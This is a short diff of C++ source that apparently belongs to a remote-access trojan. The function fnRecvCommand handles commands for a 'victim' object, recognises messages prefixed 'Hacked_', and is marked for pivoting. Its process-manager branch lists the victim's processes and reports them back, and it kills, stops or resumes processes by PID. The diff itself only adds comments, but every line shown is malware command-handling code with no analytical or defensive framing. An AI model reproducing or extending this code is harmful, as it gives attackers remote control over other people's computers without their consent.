@@ -78,6 +78,7 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
         if (vuMsg.size() == 0)
             return;
 
+        //Pivoting
         std::vector<std::string> vsMsg;
         if (vuMsg[0].rfind("Hacked_", 0) == 0)
         {
@@ -352,7 +353,7 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
         {
             clsProcMgr procMgr;
 
-            if (vsMsg[1] == "ls")
+            if (vsMsg[1] == "ls") //Get processes.
             {
                 auto lsProc = procMgr.fnGetProcesses();
                 STRLIST ls = {
@@ -363,7 +364,7 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
 
                 victim->fnSendCommand(ls);
             }
-            else if (vsMsg[1] == "kill")
+            else if (vsMsg[1] == "kill") //Kill process with specified Pid.
             {
                 pid_t pid = std::stoi(vsMsg[2]);
                 auto[nCode, szMsg] = procMgr.fnKillProcess(pid);
@@ -377,7 +378,7 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
 
                 victim->fnSendCommand(ls);
             }
-            else if (vsMsg[1] == "stop")
+            else if (vsMsg[1] == "stop") //Stop process with specified Pid.
             {
                 pid_t pid = std::stoi(vsMsg[2]);
                 auto[nCode, szMsg] = procMgr.fnStopProcess(pid);
@@ -391,7 +392,7 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
 
                 victim->fnSendCommand(ls);
             }
-            else if (vsMsg[1] == "cont")
+            else if (vsMsg[1] == "cont") //Resume process with specified Pid.
             {
                 pid_t pid = std::stoi(vsMsg[2]);
                 auto[nCode, szMsg] = procMgr.fnContinueProcess(pid);
